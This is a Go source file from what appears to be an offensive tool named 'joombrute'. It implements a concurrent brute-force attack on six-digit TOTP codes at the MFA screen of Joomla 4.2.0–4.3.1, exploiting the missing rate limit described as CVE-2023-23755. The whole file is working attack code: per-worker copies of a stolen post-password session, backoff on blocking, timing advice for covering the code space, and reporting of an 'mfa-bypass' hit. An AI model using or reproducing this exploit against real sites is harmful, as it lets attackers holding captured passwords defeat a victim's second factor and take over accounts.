package mfa

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"github.com/rvzsec/joombrute/internal/httpx"
	"github.com/rvzsec/joombrute/internal/output"
)

// TOTPBruteConfig drives the CVE-2023-23755 attack: exhaustive 6-digit
// brute against the captive screen of a Joomla 4.2.0 - 4.3.1 install with
// MFA enabled and a captured (username, password) pair.
type TOTPBruteConfig struct {
	// CaptiveURL is the captive page the operator landed on after the
	// password POST returned OutcomeMFARequired.
	CaptiveURL string
	// CookieSourceClient is a client whose jar already holds the post-
	// password session cookie. We clone its cookies into per-worker clients
	// so each goroutine has its own jar but starts from the same session.
	CookieSourceClient *http.Client
	Concurrency        int
	RequestTimeout     time.Duration
	Proxy              string
	UserAgent          string
	InsecureTLS        bool
	// StartAt is the first code to try (inclusive). Default "000000".
	StartAt string
	// EndAt is the last code to try (inclusive). Default "999999".
	EndAt string
	// BackoffBlocked is the sleep after a 429/403/503.
	BackoffBlocked time.Duration
	Sink           output.Sink
	// Target is the friendly name used in Hit emits.
	Target   string
	Username string
}

// TOTPBruteStats reports the campaign result.
type TOTPBruteStats struct {
	Attempted int64
	Accepted  int64
	Blocked   int64
	Errors    int64
	WinCode   string
	Elapsed   time.Duration
}

// BruteTOTP exhausts the 6-digit TOTP space against the captive screen,
// exploiting CVE-2023-23755 (Joomla 4.2.0 - 4.3.1, no rate limit on captive).
//
// CAVEATS:
// - TOTP windows are 30s by default. The captive endpoint accepts +/- 1
//     window, so each candidate is effectively valid for ~90s. A long brute
//     MUST respect that boundary or it can miss the hit; tune concurrency
//     accordingly (~12k attempts/window is enough to cover 1e6 in 75 windows,
//     i.e. ~37 min wall-clock at sustainable load).
// - On 4.3.2+ this CVE is patched and the captive screen rate-limits.
func BruteTOTP(ctx context.Context, cfg TOTPBruteConfig) (TOTPBruteStats, error) {
	if cfg.CaptiveURL == "" {
		return TOTPBruteStats{}, fmt.Errorf("captive URL required")
	}
	if cfg.CookieSourceClient == nil {
		return TOTPBruteStats{}, fmt.Errorf("cookie source client required")
	}
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 25
	}
	if cfg.RequestTimeout == 0 {
		cfg.RequestTimeout = 10 * time.Second
	}
	if cfg.BackoffBlocked == 0 {
		cfg.BackoffBlocked = 3 * time.Second
	}
	if cfg.Sink == nil {
		return TOTPBruteStats{}, fmt.Errorf("sink required")
	}
	start, end, err := parseRange(cfg.StartAt, cfg.EndAt)
	if err != nil {
		return TOTPBruteStats{}, err
	}

	runCtx, cancel := context.WithCancel(ctx)
	defer cancel()

	codes := make(chan string, cfg.Concurrency*4)
	stats := &TOTPBruteStats{}
	var hitMu sync.Mutex
	t0 := time.Now()

	var wg sync.WaitGroup
	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			runTOTPWorker(runCtx, id, cfg, codes, stats, &hitMu, cancel)
		}(i)
	}

	// Producer.
	go func() {
		defer close(codes)
		for n := start; n <= end; n++ {
			select {
			case <-runCtx.Done():
				return
			case codes <- fmt.Sprintf("%06d", n):
			}
		}
	}()

	wg.Wait()
	stats.Elapsed = time.Since(t0)
	return *stats, nil
}

func runTOTPWorker(
	ctx context.Context,
	id int,
	cfg TOTPBruteConfig,
	codes <-chan string,
	stats *TOTPBruteStats,
	hitMu *sync.Mutex,
	cancel context.CancelFunc,
) {
	client, err := httpx.New(httpx.Config{
		Timeout:         cfg.RequestTimeout,
		Proxy:           cfg.Proxy,
		UserAgent:       cfg.UserAgent,
		InsecureTLS:     cfg.InsecureTLS,
		FollowRedirects: false,
	})
	if err != nil {
		cfg.Sink.Errorf("totp worker %d: client init: %v", id, err)
		atomic.AddInt64(&stats.Errors, 1)
		return
	}
	if err := cloneCookies(cfg.CookieSourceClient, client, cfg.CaptiveURL); err != nil {
		cfg.Sink.Errorf("totp worker %d: clone cookies: %v", id, err)
		atomic.AddInt64(&stats.Errors, 1)
		return
	}

	form, err := FetchCaptiveForm(ctx, client, cfg.CaptiveURL)
	if err != nil {
		// Workers started after a peer already won will see a cancelled
		// ctx - that's expected, not an error worth logging.
		if ctx.Err() == nil {
			cfg.Sink.Errorf("totp worker %d: fetch captive: %v", id, err)
			atomic.AddInt64(&stats.Errors, 1)
		}
		return
	}

	for {
		select {
		case <-ctx.Done():
			return
		case code, ok := <-codes:
			if !ok {
				return
			}
			outcome, err := SubmitCode(ctx, client, form, code)
			if err != nil {
				// Cancelled ctx = peer worker won; not a real error.
				if ctx.Err() != nil {
					return
				}
				atomic.AddInt64(&stats.Attempted, 1)
				atomic.AddInt64(&stats.Errors, 1)
				continue
			}
			atomic.AddInt64(&stats.Attempted, 1)
			switch outcome {
			case CodeOutcomeAccepted:
				hitMu.Lock()
				stats.WinCode = code
				hitMu.Unlock()
				atomic.AddInt64(&stats.Accepted, 1)
				cfg.Sink.Hit(output.Hit{
					Target:   cfg.Target,
					Username: cfg.Username,
					Outcome:  "mfa-bypass",
					Note:     "CVE-2023-23755 TOTP brute hit: code=" + code,
				})
				cancel()
				return
			case CodeOutcomeBlocked:
				atomic.AddInt64(&stats.Blocked, 1)
				cfg.Sink.Warnf("totp worker %d: blocked - backing off %s", id, cfg.BackoffBlocked)
				select {
				case <-ctx.Done():
					return
				case <-time.After(cfg.BackoffBlocked):
				}
				if nf, err := FetchCaptiveForm(ctx, client, cfg.CaptiveURL); err == nil {
					form = nf
				}
			case CodeOutcomeRejected:
				// expected - no log spam
			case CodeOutcomeUnknown:
				cfg.Sink.Debugf("totp worker %d: unknown for code %s", id, code)
			}
		}
	}
}

func parseRange(startS, endS string) (int, int, error) {
	if startS == "" {
		startS = "000000"
	}
	if endS == "" {
		endS = "999999"
	}
	if len(startS) != 6 || len(endS) != 6 {
		return 0, 0, fmt.Errorf("range must be 6-digit codes")
	}
	start, err := parseDigits(startS)
	if err != nil {
		return 0, 0, fmt.Errorf("start: %w", err)
	}
	end, err := parseDigits(endS)
	if err != nil {
		return 0, 0, fmt.Errorf("end: %w", err)
	}
	if start > end {
		return 0, 0, fmt.Errorf("start > end")
	}
	return start, end, nil
}

func parseDigits(s string) (int, error) {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return 0, fmt.Errorf("non-digit %q", s)
		}
		n = n*10 + int(c-'0')
	}
	return n, nil
}

// cloneCookies copies cookies set for targetURL from src's jar into dst's.
// This is how we propagate the post-password session to every TOTP worker
// without sharing a single client (which would serialize all requests
// behind the jar's mutex and kill concurrency).
func cloneCookies(src, dst *http.Client, targetURL string) error {
	if src == nil || dst == nil || src.Jar == nil || dst.Jar == nil {
		return fmt.Errorf("nil client/jar")
	}
	u, err := url.Parse(targetURL)
	if err != nil {
		return fmt.Errorf("parse target: %w", err)
	}
	dst.Jar.SetCookies(u, src.Jar.Cookies(u))
	return nil
}
